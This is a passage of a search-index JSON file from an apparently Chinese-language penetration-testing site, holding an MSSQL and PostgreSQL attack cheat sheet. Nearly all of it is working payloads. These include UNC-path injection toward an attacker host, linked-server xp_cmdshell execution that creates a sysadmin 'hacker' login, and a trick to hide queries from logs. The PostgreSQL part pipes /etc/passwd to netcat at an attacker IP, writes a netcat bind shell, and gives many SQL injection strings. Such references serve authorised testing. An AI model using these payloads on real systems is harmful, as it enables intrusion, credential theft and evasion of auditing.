'\\\\10.10.15.XX\\SHARE';-- xp_dirtree '\\\\attackerip\\file' xp_fileexist '\\\\attackerip\\file' BACKUP LOG [TESTING] TO DISK = '\\\\attackerip\\file' BACKUP DATABASE [TESTING] TO DISK = '\\\\attackeri\\file' RESTORE LOG [TESTING] FROM DISK = '\\\\attackerip\\file' RESTORE DATABASE [TESTING] FROM DISK = '\\\\attackerip\\file' RESTORE HEADERONLY FROM DISK = '\\\\attackerip\\file' RESTORE FILELISTONLY FROM DISK = '\\\\attackerip\\file' RESTORE LABELONLY FROM DISK = '\\\\attackerip\\file' RESTORE REWINDONLY FROM DISK = '\\\\attackerip\\file' RESTORE VERIFYONLY FROM DISK = '\\\\attackerip\\file'","title":"MSSQL UNC \u8def\u5f84"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/myssql/#mssql-db","text":"EXEC master.dbo.sp_addsrvrolemember 'user', 'sysadmin;","title":"MSSQL \u63d0\u5347\u6743\u9650\u4e3a DB \u7ba1\u7406\u5458"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/myssql/#mssql_18","text":"The links between databases work even across forest trusts. msf> use exploit/windows/mssql/mssql_linkcrawler [msf> set DEPLOY true] #Set DEPLOY to true if you want to abuse the privileges to obtain a meterpreter sessio Manual exploitation -- find link select * from master..sysservers -- execute query through the link select * from openquery(\"dcorp-sql1\", 'select * from master..sysservers') select version from openquery(\"linkedserver\", 'select @@version as version'); -- chain multiple openquery select version from openquery(\"link1\",'select version from openquery(\"link2\",\"select @@version as version\")') -- execute shell commands EXECUTE('sp_configure ''xp_cmdshell'',1;reconfigure;') AT LinkedServer select 1 from openquery(\"linkedserver\",'select 1;exec master..xp_cmdshell \"dir c:\"') -- create user and give admin privileges EXECUTE('EXECUTE(''CREATE LOGIN hacker WITH PASSWORD = ''''P@ssword123.'''' '') AT \"DOMINIO\\SERVER1\"') AT \"DOMINIO\\SERVER2\" EXECUTE('EXECUTE(''sp_addsrvrolemember ''''hacker'''' , ''''sysadmin'''' '') AT \"DOMINIO\\SERVER1\"') AT \"DOMINIO\\SERVER2\"","title":"MSSQL \u53d7\u4fe1\u4efb\u94fe\u63a5"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/myssql/#_1","text":"\u5217\u51fa\u5f53\u524d\u7528\u6237\u5728\u670d\u52a1\u5668\u4e0a\u7684\u6709\u6548\u6743\u9650\u3002 SELECT * FROM fn_my_permissions(NULL, 'SERVER'); \u5217\u51fa\u5f53\u524d\u7528\u6237\u5728\u6570\u636e\u5e93\u4e0a\u7684\u6709\u6548\u6743\u9650\u3002 SELECT * FROM fn_my_permissions (NULL, 'DATABASE'); \u5217\u51fa\u5f53\u524d\u7528\u6237\u5728\u89c6\u56fe\u4e0a\u7684\u6709\u6548\u6743\u9650\u3002 SELECT * FROM fn_my_permissions('Sales.vIndividualCustomer', 'OBJECT') ORDER BY subentity_name, permission_name; \u68c0\u67e5\u5f53\u524d\u7528\u6237\u662f\u5426\u5c5e\u4e8e\u6307\u5b9a\u7684\u670d\u52a1\u5668\u89d2\u8272\u3002 -- possible roles: sysadmin, serveradmin, dbcreator, setupadmin, bulkadmin, securityadmin, diskadmin, public, processadmin SELECT is_srvrolemember('sysadmin');","title":"\u5217\u51fa\u6743\u9650"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/myssql/#mssql-opsec","text":"\u5728\u67e5\u8be2\u4e2d\u4f7f\u7528 SP_PASSWORD \u4ee5\u9690\u85cf\u65e5\u5fd7\uff0c\u5982\uff1a ' AND 1=1--sp_password -- 'sp_password' was found in the text of this event. -- The text has been replaced with this comment for security reasons.","title":"MSSQL OPSEC"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/myssql/#references","text":"\u6ce8\uff1a\u5927\u90e8\u5206\u5185\u5bb9\u7ffb\u8bd1\u81f3\uff1a https://github.com/swisskyrepo/PayloadsAllTheThings MSSQL\u6e17\u900f\u6d4b\u8bd5 Pentest Monkey - mssql-sql-injection-cheat-sheet Error Based - SQL Injection MSSQL Trusted Links - HackTricks.xyz SQL Server \u2013 Link\u2026 Link\u2026 Link\u2026 and Shell: How to Hack Database Links in SQL Server! - Antti Rantasaari - June 6th, 2013 DAFT: Database Audit Framework & Toolkit - NetSPI SQL Server UNC Path Injection Cheatsheet - nullbind Full MSSQL Injection PWNage - ZeQ3uL && JabAv0C - 28 January 2009 Microsoft - sys.fn_my_permissions (Transact-SQL) Microsoft - IS_SRVROLEMEMBER (Transact-SQL) AWS WAF Clients Left Vulnerable to SQL Injection Due to Unorthodox MSSQL Design Choice - Marc Olivier Bergeron - Jun 21, 2023","title":"References"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/","text":"postgresql PostgreSQL \u547d\u4ee4\u6267\u884c CVE-2019\u20139193 DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec; \u4f7f\u7528 libc.so.6 CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT; SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>'); PostgreSQL \u6ce8\u91ca -- /**/ PostgreSQL \u94fe\u6ce8\u5165\u70b9\u7b26\u53f7 ; #\u7528\u4e8e\u7ec8\u6b62 SQL \u547d\u4ee4\u3002\u5728\u8bed\u53e5\u4e2d\u552f\u4e00\u53ef\u4f7f\u7528\u7684\u4f4d\u7f6e\u662f\u5728\u5b57\u7b26\u4e32\u5e38\u91cf\u6216\u5f15\u7528\u6807\u8bc6\u7b26\u4e2d\u3002 || #\u6216\u8bed\u53e5 # \u4f7f\u7528\u793a\u4f8b: /?whatever=1;(select 1 from pg_sleep(5)) /?whatever=1||(select 1 from pg_sleep(5)) PostgreSQL \u7248\u672c SELECT version() PostgreSQL \u5f53\u524d\u7528\u6237 SELECT user; SELECT current_user; SELECT session_user; SELECT usename FROM pg_user; SELECT getpgusername(); PostgreSQL \u7528\u6237\u5217\u8868 SELECT usename FROM pg_user PostgreSQL \u5bc6\u7801\u54c8\u5e0c\u5217\u8868 SELECT usename, passwd FROM pg_shadow \u67e5\u8be2\u6570\u636e\u5e93\u7ba1\u7406\u5458\u8d26\u6237\u5217\u8868 SELECT usename FROM pg_user WHERE usesuper IS TRUE PostgreSQL \u6743\u9650\u5217\u8868 SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user \u67e5\u8be2\u5f53\u524d\u7528\u6237\u662f\u5426\u4e3a\u8d85\u7ea7\u7528\u6237 SHOW is_superuser; SELECT current_setting('is_superuser'); SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER; PostgreSQL \u6570\u636e\u5e93\u540d\u79f0 SELECT current_database() PostgreSQL \u6570\u636e\u5e93\u5217\u8868 SELECT datname FROM pg_database PostgreSQL \u8868\u683c\u5217\u8868 SELECT table_name FROM information_schema.tables PostgreSQL \u5217\u8868\u5217 SELECT column_name FROM information_schema.columns WHERE table_name='data_table' PostgreSQL \u62a5\u9519\u6ce8\u5165 ,cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC) ,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)-- ,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name='data_table'+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)-- ,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC) ' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1 ' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1 ' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1 ' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1 PostgreSQL XML \u5e2e\u52a9\u5668 select query_to_xml('select * from pg_user',true,true,''); -- \u8fd4\u56de\u6240\u6709\u7ed3\u679c\u4f5c\u4e3a\u5355\u4e2a xml \u884c select database_to_xml(true,true,''); -- \u5c06\u5f53\u524d\u6570\u636e\u5e93\u8f6c\u50a8\u4e3a XML select database_to_xmlschema(true,true,''); -- \u5c06\u5f53\u524d\u6570\u636e\u5e93\u8f6c\u50a8\u4e3a XML \u67b6\u6784 PostgreSQL \u76f2\u6ce8 ' and substr(version(),1,10) = 'PostgreSQL' and '1' -> OK ' and substr(version(),1,10) = 'PostgreXXX' and '1' -> KO PostgreSQL \u65f6\u95f4\u76f2\u6ce8 select 1 from pg_sleep(5) ;(select 1 from pg_sleep(5)) ||(select 1 from pg_sleep(5)) select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1 select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1 select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1 select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name where column_name='value' limit 1 AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000)) PostgreSQL \u5806\u53e0\u67e5\u8be2 http://host/vuln.php?id=injection';create table NotSoSecure (data varchar(200));-- PostgreSQL \u6587\u4ef6\u8bfb\u53d6 select pg_ls_dir('./'); select pg_read_file('PG_VERSION', 0, 200); PostgreSQL \u6587\u4ef6\u5199\u5165 CREATE TABLE pentestlab (t TEXT); INSERT INTO pentestlab(t) VALUES('nc -lvvp 2346 -e /bin/bash'); SELECT * FROM pentestlab; COPY pentestlab(t) TO '/tmp/pentestlab'; \u7ed5\u8fc7\u8fc7\u6ee4\u5668 \u5f15\u53f7 \u4f7f\u7528 CHR SELECT CHR(65)||CHR(66)||CHR(67); \u4f7f\u7528 $ \u7b26\u53f7\uff08\u9002\u7528\u4e8e PostgreSQL 8\u53ca\u4ee5\u4e0a\u7248\u672c\uff09 SELECT $$This is a string$$ SELECT $TAG$This is another string$TAG$ \u6ce8\uff1a\u5927\u90e8\u5206\u5185\u5bb9\u7ffb\u8bd1\u81f3\uff1a https://github.com/swisskyrepo/PayloadsAllTheThings","title":"postgresql"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql","text":"","title":"postgresql"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql_1","text":"","title":"PostgreSQL \u547d\u4ee4\u6267\u884c"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#cve-20199193","text":"DROP TABLE IF EXISTS cmd_exec; CREATE TABLE cmd_exec(cmd_output text); COPY cmd_exec FROM PROGRAM 'id'; SELECT * FROM cmd_exec;","title":"CVE-2019\u20139193"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#libcso6","text":"CREATE OR REPLACE FUNCTION system(cstring) RETURNS int AS '/lib/x86_64-linux-gnu/libc.so.6', 'system' LANGUAGE 'c' STRICT; SELECT system('cat /etc/passwd | nc <attacker IP> <attacker port>');","title":"\u4f7f\u7528 libc.so.6"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql_2","text":"-- /**/","title":"PostgreSQL \u6ce8\u91ca"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql_3","text":"; #\u7528\u4e8e\u7ec8\u6b62 SQL \u547d\u4ee4\u3002\u5728\u8bed\u53e5\u4e2d\u552f\u4e00\u53ef\u4f7f\u7528\u7684\u4f4d\u7f6e\u662f\u5728\u5b57\u7b26\u4e32\u5e38\u91cf\u6216\u5f15\u7528\u6807\u8bc6\u7b26\u4e2d\u3002 || #\u6216\u8bed\u53e5 # \u4f7f\u7528\u793a\u4f8b: /?whatever=1;(select 1 from pg_sleep(5)) /?whatever=1||(select 1 from pg_sleep(5))","title":"PostgreSQL \u94fe\u6ce8\u5165\u70b9\u7b26\u53f7"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql_4","text":"SELECT version()","title":"PostgreSQL \u7248\u672c"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql_5","text":"SELECT user; SELECT current_user; SELECT session_user; SELECT usename FROM pg_user; SELECT getpgusername();","title":"PostgreSQL \u5f53\u524d\u7528\u6237"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql_6","text":"SELECT usename FROM pg_user","title":"PostgreSQL \u7528\u6237\u5217\u8868"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql_7","text":"SELECT usename, passwd FROM pg_shadow","title":"PostgreSQL \u5bc6\u7801\u54c8\u5e0c\u5217\u8868"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#_1","text":"SELECT usename FROM pg_user WHERE usesuper IS TRUE","title":"\u67e5\u8be2\u6570\u636e\u5e93\u7ba1\u7406\u5458\u8d26\u6237\u5217\u8868"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql_8","text":"SELECT usename, usecreatedb, usesuper, usecatupd FROM pg_user","title":"PostgreSQL \u6743\u9650\u5217\u8868"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#_2","text":"SHOW is_superuser; SELECT current_setting('is_superuser'); SELECT usesuper FROM pg_user WHERE usename = CURRENT_USER;","title":"\u67e5\u8be2\u5f53\u524d\u7528\u6237\u662f\u5426\u4e3a\u8d85\u7ea7\u7528\u6237"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql_9","text":"SELECT current_database()","title":"PostgreSQL \u6570\u636e\u5e93\u540d\u79f0"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql_10","text":"SELECT datname FROM pg_database","title":"PostgreSQL \u6570\u636e\u5e93\u5217\u8868"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql_11","text":"SELECT table_name FROM information_schema.tables","title":"PostgreSQL \u8868\u683c\u5217\u8868"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql_12","text":"SELECT column_name FROM information_schema.columns WHERE table_name='data_table'","title":"PostgreSQL \u5217\u8868\u5217"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql_13","text":",cAsT(chr(126)||vErSiOn()||chr(126)+aS+nUmeRiC) ,cAsT(chr(126)||(sEleCt+table_name+fRoM+information_schema.tables+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)-- ,cAsT(chr(126)||(sEleCt+column_name+fRoM+information_schema.columns+wHerE+table_name='data_table'+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC)-- ,cAsT(chr(126)||(sEleCt+data_column+fRoM+data_table+lImIt+1+offset+data_offset)||chr(126)+as+nUmeRiC) ' and 1=cast((SELECT concat('DATABASE: ',current_database())) as int) and '1'='1 ' and 1=cast((SELECT table_name FROM information_schema.tables LIMIT 1 OFFSET data_offset) as int) and '1'='1 ' and 1=cast((SELECT column_name FROM information_schema.columns WHERE table_name='data_table' LIMIT 1 OFFSET data_offset) as int) and '1'='1 ' and 1=cast((SELECT data_column FROM data_table LIMIT 1 OFFSET data_offset) as int) and '1'='1","title":"PostgreSQL \u62a5\u9519\u6ce8\u5165"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql-xml","text":"select query_to_xml('select * from pg_user',true,true,''); -- \u8fd4\u56de\u6240\u6709\u7ed3\u679c\u4f5c\u4e3a\u5355\u4e2a xml \u884c select database_to_xml(true,true,''); -- \u5c06\u5f53\u524d\u6570\u636e\u5e93\u8f6c\u50a8\u4e3a XML select database_to_xmlschema(true,true,''); -- \u5c06\u5f53\u524d\u6570\u636e\u5e93\u8f6c\u50a8\u4e3a XML \u67b6\u6784","title":"PostgreSQL XML \u5e2e\u52a9\u5668"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql_14","text":"' and substr(version(),1,10) = 'PostgreSQL' and '1' -> OK ' and substr(version(),1,10) = 'PostgreXXX' and '1' -> KO","title":"PostgreSQL \u76f2\u6ce8"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql_15","text":"select 1 from pg_sleep(5) ;(select 1 from pg_sleep(5)) ||(select 1 from pg_sleep(5)) select case when substring(datname,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from pg_database limit 1 select case when substring(table_name,1,1)='a' then pg_sleep(5) else pg_sleep(0) end from information_schema.tables limit 1 select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name limit 1 select case when substring(column,1,1)='1' then pg_sleep(5) else pg_sleep(0) end from table_name where column_name='value' limit 1 AND [RANDNUM]=(SELECT [RANDNUM] FROM PG_SLEEP([SLEEPTIME])) AND [RANDNUM]=(SELECT COUNT(*) FROM GENERATE_SERIES(1,[SLEEPTIME]000000))","title":"PostgreSQL \u65f6\u95f4\u76f2\u6ce8"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql_16","text":"http://host/vuln.php?id=injection';create table NotSoSecure (data varchar(200));--","title":"PostgreSQL \u5806\u53e0\u67e5\u8be2"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql_17","text":"select pg_ls_dir('./'); select pg_read_file('PG_VERSION', 0, 200);","title":"PostgreSQL \u6587\u4ef6\u8bfb\u53d6"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#postgresql_18","text":"CREATE TABLE pentestlab (t TEXT); INSERT INTO pentestlab(t) VALUES('nc -lvvp 2346 -e /bin/bash'); SELECT * FROM pentestlab; COPY pentestlab(t) TO '/tmp/pentestlab';","title":"PostgreSQL \u6587\u4ef6\u5199\u5165"},{"location":"%E6%95%B0%E6%8D%AE%E5%BA%93%E5%91%BD%E4%BB%A4%E9%80%9F%E6%9F%A5/postgresql/#_3","text":"\u5f15\u53f7 \u4f7f\u7528 CHR SELECT CHR(65)||CHR(66)||CHR(67); \u4f7f\u7528 $ \u7b26\u53f7\uff08\u9002\u7528\u4e8e PostgreSQL 8\u53ca\u4ee5\u4e0a\u7248\u672c\uff09 SELECT $$This is a string$$ SELECT $TAG$This is another string$TAG$ \u6ce8\uff1a\u5927\u90e8\u5206\u5185\u5bb9\u7ffb\u8bd1\u81f3\uff1a https://github.com/swisskyrepo/PayloadsAllTheThings","title":"\u7ed5\u8fc7\u8fc7\u6ee4\u5668"}]}